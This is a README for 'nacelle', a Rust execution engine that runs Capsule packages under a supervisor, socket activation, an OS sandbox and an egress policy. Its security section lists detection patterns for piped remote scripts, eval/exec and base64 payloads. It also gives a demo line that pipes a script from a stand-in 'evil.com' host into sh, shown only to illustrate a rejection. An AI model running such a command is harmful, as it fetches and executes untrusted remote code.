# nacelle

**Source runtime engine for Capsules** — Supervisor / Socket Activation / OS Sandbox を提供する、デーモンレスな実行コア。

[![Spec](https://img.shields.io/badge/Capsule-Spec-blue)](../uarc/SPEC.md)
[![License](https://img.shields.io/badge/license-Apache--2.0-green)](LICENSE)

## Overview

**nacelle** は、Capsule（`capsule.toml` とソース/アーカイブ）を **ローカルで安全に起動するための低レベル実行エンジン**です。
具体的には Source 実行（Python/Node/Ruby など）を中心に、
Supervisor / Socket Activation / OS ネイティブ Sandbox をまとめて提供します。

本リポジトリは v2.0 系の設計として、中央デーモンを廃止し、
各実行プロセスが **Supervisor（Actor）** を持つ “単体完結” の実行モデルに移行しています。

## nacelle と capsule の責務切り分け

この README では、レイヤーを次のように整理します。

- **capsule（メタランタイム / CLI 層）**: 複数ランタイムの抽象化・ディスパッチ・パッケージング全体・高レベル UX
- **nacelle（source 実行エンジン層）**: source 実行に特化した実行コア（Supervisor / Socket Activation / Sandbox / JIT Provisioning）

本リポジトリは **nacelle** 側（低レベル実装）です。現時点では `nacelle` CLI を同梱していますが、
想定アーキテクチャ上の「ユーザーが触る入口」は `capsule` CLI（メタ層）になります。

## Capsule とは

- 設定: `capsule.toml`
- 生成物: `.capsule`（署名可能なアーカイブ） / 自己解凍バンドル（単一実行ファイル）
- 実行: Source（Python/Node/Ruby など）/ Wasm / Docker（必要に応じて）

## Key Features

- **Self-Extracting Bundle**: 依存ゼロで配布できる単一バイナリを生成
- **JIT Provisioning**: ランタイム（例: Python）を必要時に自動取得してキャッシュ
- **Socket Activation**: 親プロセスが先にポートを確保し、FD を子へ引き継ぐ
- **Supervisor (Actor)**: 子プロセス監視・シグナル処理・クリーンアップを堅牢化
- **OS Sandbox**: Linux（Landlock）/ macOS（Seatbelt）で書き込み範囲を制限

## Architecture (v2.0)

```
┌─────────────────────────────────────────────────────────┐
│                       capsule (meta)                      │
├─────────────────────────────────────────────────────────┤
│  High-level CLI / Orchestration / Packaging               │
│  ├─ capsule dev / pack / open                              │
│  └─ runtime selection + dispatch                            │
└─────────────────────────────────────────────────────────┘
					 │ calls into
					 ▼
┌─────────────────────────────────────────────────────────┐
│                      nacelle (source)                     │
├─────────────────────────────────────────────────────────┤
│  CLI / Bundler (direct use is optional)                   │
│  ├─ nacelle dev / pack --bundle                            │
│  └─ (bundle execution path)                               │
├─────────────────────────────────────────────────────────┤
│  Execution Core                                           │
│  ├─ Socket Activation (FD passing)                        │
│  ├─ Supervisor (Actor)                                    │
│  └─ Sandbox (Landlock / Seatbelt)                         │
├─────────────────────────────────────────────────────────┤
│  Source Runtime                                           │
│  └─ Python/Node/Ruby/... + JIT Provisioning               │
└─────────────────────────────────────────────────────────┘
```

## Building

### Quick Start (macOS)

最短で「バンドル生成→実行」まで確認する手順です。

```bash
# 1) CLI をビルド（リリース推奨）
cd cli
cargo build --release

# 2) サンプルをバンドル化（単一バイナリ生成）
cd ../samples/simple-todo
../../target/release/nacelle pack --bundle --manifest capsule.toml

# 3) 生成されたバンドルを実行
./nacelle-bundle
```

### Fast Dev Loop

普段の反復は、バンドル生成を挟まずに `nacelle dev` を使う想定です。

```bash
cd samples/simple-todo
../../target/debug/nacelle dev --manifest capsule.toml
```

### Prerequisites

- Rust 1.82+ (2021 edition)
- (必要に応じて) Cap'n Proto compiler (`capnp`)
- (macOS) Zig and MinGW-w64 for cross-compilation
- (Optional) CUDA toolkit for GPU support
- (Optional) LVM tools for storage management

### Standard Build

```bash
# Development build
cargo build

# Release build (current platform only)
cargo build --release
```

### Run Tests

```bash
cargo test
```

## Usage

### Self-Extracting Bundle を実行する

バンドルとして実行されると、nacelle は埋め込みランタイムを展開し、Supervisor と Sandbox を適用してアプリを起動します。

```bash
./nacelle-bundle
```

### Configuration

v2.0 の基本運用は “バンドル実行” を中心に設計しています。
（旧来の Engine 設定ファイルやデーモン運用は廃止・整理中です）

## Security Model

nacelle は多層防御アーキテクチャを実装し、Verifiable Execution を保証します。

### L1 Source Policy (ソースコード検証)

ソースコードに含まれる危険なパターンを検出・拒否します：

| パターン                       | 検出理由               |
| ------------------------------ | ---------------------- |
| `curl \| sh`, `wget \| bash`   | リモートコード注入     |
| `eval`, `exec`                 | 動的コード実行         |
| `base64 -d`, `base64 --decode` | 難読化されたペイロード |

```bash
# 例: 危険なコードを含むカプセルはデプロイが拒否される
echo 'curl https://evil.com | sh' > malicious.sh
nacelle dev  # → L1 Policy Violation: Obfuscation detected
```

### L3 Pre-Execution Analysis

実行時マニフェストの静的解析により、追加の危険パターンを検出します。

### L4 Network Guard (Egress Policy)

ネットワーク通信は `EgressPolicyRegistry` により制御されます：

- カプセルごとにアイデンティティトークン (`UARC_IDENTITY_TOKEN`) を発行
- マニフェストで指定された `egress_allow` ルールのみ許可
- 未許可のアウトバウンド通信はプロキシでブロック

### Dev Mode セキュリティ

開発モードでのサンドボックス緩和は、上位レイヤー（将来の `capsule`）側のポリシーで制御する想定です。
（この repo では `nacelle dev` が「開発者体験優先」で best-effort 実行します）

```
effective_dev_mode = manifest.dev_mode AND policy.allow_insecure_dev_mode
```

| マニフェスト `dev_mode` | Policy `allow_insecure_dev_mode` | 結果                             |
| ----------------------- | -------------------------------- | -------------------------------- |
| `true`                  | `true`                           | ✅ サンドボックス緩和            |
| `true`                  | `false`                          | ❌ サンドボックス維持 (警告出力) |
| `false`                 | `true`                           | ❌ サンドボックス維持            |
| `false`                 | `false`                          | ❌ サンドボックス維持            |

### 環境変数

| 変数名                | デフォルト | 説明 |
| --------------------- | ---------- | ---- |
| `NACELLE_PATH`        | (未設定)   | （将来の `capsule` から）利用する nacelle エンジンのパスを明示したい場合に指定 |
| `NACELLE_BINARY`      | (未設定)   | `pack --bundle` 時に使用する nacelle 本体のパスを明示したい場合に指定 |
| `CAPSULE_ENGINE_URL`  | (任意)     | 旧互換のため残る場合があるエンジンURL（整理中） |

## Verification (Production)

### CAS-based Verification

本番相当の運用では、ソースコードは CAS (Content-Addressable Storage) から取得・検証されます（主にメタ層 `capsule` の責務）：

1. マニフェストに `source_digest` (SHA256) を記載
2. Runner（メタ層）が CAS からソースをフェッチ
3. ダイジェストを検証後、L1 Source Policy スキャンを実行
4. 全て通過後にのみ実行を許可

## Runtime Selection

`capsule.toml` を見て「どのランタイムを使うか」を決めるのは、メタ層（`capsule`）の責務です。
この repo の `nacelle` は、主に **Source 実行**のバックエンドになります。
（Wasm / OCI などは現状この repo に実装があるものの、将来的に別エンジンへ分離される可能性があります）

- **Wasm**: `runtime.type = "wasm"` → `WasmRuntime`
- **Source**: `runtime.type = "source"` → `SourceRuntime` or `DevRuntime`
- **OCI**: `runtime.type = "oci"` or `runtime.type = "docker"` → `YoukiRuntime` (Linux) or `DockerCliRuntime` (macOS)

### Legacy Compatibility

Native runtime manifests are automatically migrated to Source runtime:

```toml
# Legacy (auto-converted)
[runtime]
type = "native"
binary_path = "/usr/bin/my-app"

# Converts to:
[runtime]
type = "source"
language = "generic"
cmd = ["/usr/bin/my-app"]
```

## Development

### Project Structure

```
nacelle/
├── src/
│   ├── engine/         # Supervisor, Socket Activation
│   ├── runtime/        # L3: Wasm, Source, OCI runtimes
│   ├── resource/       # L2: Ingestion, Artifacts, Storage
│   ├── common/         # L1: Proto, Types, Contracts
│   ├── security/       # Path validation, Access control
│   ├── verification/   # Signature, VRAM scrubbing, Sandbox
│   └── observability/  # Metrics, Audit, Tracing
├── proto/              # gRPC protocol definitions
└── docs/               # Architecture & implementation docs
```

### Key Documents

- [docs/ENGINE_INTERFACE_CONTRACT.md](docs/ENGINE_INTERFACE_CONTRACT.md) - Process boundary contract (JSON over stdio) between capsule (meta) and nacelle (engine)
- [UARC_SCOPE_REVIEW.md](UARC_SCOPE_REVIEW.md) - Scope analysis and compliance review
- [PHASE13_COMPLETION.md](PHASE13_COMPLETION.md) - Native runtime removal report
- [MIGRATION_SUMMARY.md](MIGRATION_SUMMARY.md) - Migration guide from legacy architecture
- [PROJECT_OVERVIEW.md](PROJECT_OVERVIEW.md) - High-level architecture overview

## UARC V1.1.0 Compliance

nacelle は以下の UARC 仕様要件を満たしています:

### ✅ Supported

- Wasm Runtime (wasmtime-based)
- Source Runtime (Python, Node.js, Ruby, Deno, etc.)
- OCI Runtime (Youki, Docker)
- CAS-based artifact verification
- SPIFFE ID network identity
- Path validation & egress policy
- Service discovery & registration
- Metrics & audit logging

### ❌ Explicitly Excluded (UARC V1 Non-Compliance)

- **Native Runtime**: Archived (security concerns) - use Source Runtime instead
- **Tailscale/Headscale VPN**: Archived - use SPIFFE ID for peer authentication
- **Traefik Routing**: Archived - Coordinator responsibility, not Engine scope

See [UARC SPEC.md](../uarc/SPEC.md) for detailed specification.

## License

FSL-1.1-ALv2 (Functional Source License 1.1, Apache License Version 2.0)

## Contributing

1. Read [UARC SPEC.md](../uarc/SPEC.md) to understand the architecture
2. Check [UARC_SCOPE_REVIEW.md](UARC_SCOPE_REVIEW.md) for scope guidelines
3. Follow Rust best practices and maintain UARC compliance
4. Add tests for new features
5. Update documentation

## Related Projects

- [ato-coordinator](../ato-coordinator/) - Cluster orchestration & routing
- [ato-desktop](../ato-desktop/) - Desktop UI for Capsule management
- [cli](./cli/) - Nacelle CLI (pack など)
- [uarc](../uarc/) - 仕様（歴史的経緯で残置。Capsule Spec として参照）
